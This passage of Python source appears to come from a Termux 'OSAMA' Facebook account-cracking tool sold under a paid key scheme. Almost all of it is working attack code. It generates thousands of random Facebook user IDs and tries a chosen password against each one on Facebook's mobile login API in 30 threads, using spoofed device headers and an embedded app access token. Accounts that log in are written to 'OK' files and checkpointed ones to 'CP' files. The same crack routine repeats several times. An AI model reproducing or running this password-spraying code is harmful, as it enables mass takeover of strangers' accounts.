                print("\n%s \x1b[1;97m[H] SAVED OK ACCOUNT : OK.txt" % (Y))
                print("%s \x1b[1;97m[H] SAVED  CP   ACCOUNT: CP.txt" % (G))
                print("%s \x1b[1;97m[O] ON/OFF MODE IF YOU NO RESULT\x1b[0m\n" % (P))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n [>>] CRACK COMPLETE...")
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        rua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        sys.stdout.write(
            "\r [ OSᗩᗰᗩ ] %s/%s -> Ok:-%s - Cp:-%s " % (self.loop, len(self.id), len(self.cp), len(self.ok))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": rua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                print("\r \033[0;92m Congrats Bro ")
                self.ok.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-Ok.txt", "a").write(" %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-OK.txt", "a").write(" %s | %s\n" % (uid, pw))
                break
            else:
                continue

        self.loop += 1

    def old4(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        os.system('clear');
        print(logo)
        limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))

            print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, Y))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (B))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (G, listpass))
                os.system("clear")
                print(logo)
                print("\n%s \x1b[1;97m[H] SAVED OK ACCOUNT : OK.txt" % (Y))
                print("%s \x1b[1;97m[H] SAVED  CP   ACCOUNT: CP.txt" % (G))
                print("%s \x1b[1;97m[O] ON/OFF MODE IF YOU NO RESULT\x1b[0m\n" % (P))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n [>>] CRACK COMPLETE...")
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        rua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        sys.stdout.write(
            "\r [ OSᗩᗰᗩ ] %s/%s -> Ok:-%s - Cp:-%s " % (self.loop, len(self.id), len(self.cp), len(self.ok))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": rua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                print("\r \033[0;92m Congrats Bro ")
                self.ok.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-Ok.txt", "a").write(" %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-OK.txt", "a").write(" %s | %s\n" % (uid, pw))
                break
            else:
                continue

        self.loop += 1

    def old5(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        os.system('clear');
        print(logo)
        limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))

            print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, Y))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (B))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (G, listpass))
                os.system("clear")
                print(logo)
                print("\n%s \x1b[1;97m[H] SAVED OK ACCOUNT : OK.txt" % (Y))
                print("%s \x1b[1;97m[H] SAVED  CP   ACCOUNT: CP.txt" % (G))
                print("%s \x1b[1;97m[O] ON/OFF MODE IF YOU NO RESULT\x1b[0m\n" % (P))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n [>>] CRACK COMPLETE...")
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        rua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        sys.stdout.write(
            "\r [OSᗩᗰᗩ] %s/%s -> Ok:-%s - Cp:-%s " % (self.loop, len(self.id), len(self.cp), len(self.ok))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": rua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                print("\r \033[0;92m Congrats Bro ")
                self.ok.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-Ok.txt", "a").write(" %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-OK.txt", "a").write(" %s | %s\n" % (uid, pw))
                break
            else:
                continue

        self.loop += 1

    def old6(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        os.system('clear');
        print(logo)
        limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))

            print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, Y))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (B))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (G, listpass))
                os.system("clear")
                print(logo)
                print("\n%s \x1b[1;97m[H] SAVED OK ACCOUNT : OK.txt" % (Y))
                print("%s \x1b[1;97m[H] SAVED  CP   ACCOUNT: CP.txt" % (G))
                print("%s \x1b[1;97m[O] ON/OFF MODE IF YOU NO RESULT\x1b[0m\n" % (P))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n [>>] CRACK COMPLETE...")
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        rua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        sys.stdout.write(
            "\r [OSᗩᗰᗩ] %s/%s -> Ok:-%s - Cp:-%s " % (self.loop, len(self.id), len(self.cp), len(self.ok))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": rua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                print("\r \033[0;92m Congrats Bro ")
                self.ok.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-Ok.txt", "a").write(" %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-OK.txt", "a").write(" %s | %s\n" % (uid, pw))
                break
            else:
                continue

        self.loop += 1

    def old7(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        os.system('clear');
        print(logo)
        limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))

            print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, Y))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (B))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (G, listpass))
                os.system("clear")
                print(logo)
                print("\n%s \x1b[1;97m[H] SAVED OK ACCOUNT : OK.txt" % (Y))
                print("%s \x1b[1;97m[H] SAVED  CP   ACCOUNT: CP.txt" % (G))
                print("%s \x1b[1;97m[O] ON/OFF MODE IF YOU NO RESULT\x1b[0m\n" % (P))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n [>>] CRACK COMPLETE...")
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        rua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        sys.stdout.write(
            "\r [OSᗩᗰᗩ] %s/%s -> Ok:-%s - Cp:-%s " % (self.loop, len(self.id), len(self.cp), len(self.ok))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": rua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                print("\r \033[0;92m Congrats Bro ")
                self.ok.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-Ok.txt", "a").write(" %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-OK.txt", "a").write(" %s | %s\n" % (uid, pw))
                break
            else:
                continue

        self.loop += 1



def Subscraption():
    key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
    clear()
    print(logo)
    r1 = requests.get("https://www.facebook.com/profile.php?id=100024557781911").text
    if key1 in r1:
        os.system('clear')
        print(logo)
        Main()
    else:
        os.system("clear")
        print(logo)
        print("\t \033[1;32m First Get Approvel\033[1;37m ")
        time.sleep(1)
        os.system("clear")
        print(logo)
        print("")
        print(" \033[1;32m OSᗩᗰᗩ Tool Paid You Need Get Approved First\033[1;37m\n")
        print(" \033[1;32m Note : Paid Tool First send key for approved Admin \033[1;37m")
        print("")
        print(" Your Key is Not Approved ")
        print("")
        print(" Copy And Send Key To Admin")
        print("")
        print(" Your Key : " + cha + OSᗩᗰᗩ + key1)
        print("")
        name = input(" Your Name : ")
        print("")
        input(" Press Enter To Send Key")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20' + name + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' + ak + ahsan + '' + key1
        os.system('am start https://www.facebook.com/profile.php?id=100024557781911' + tks)
        Subscraption()


Main()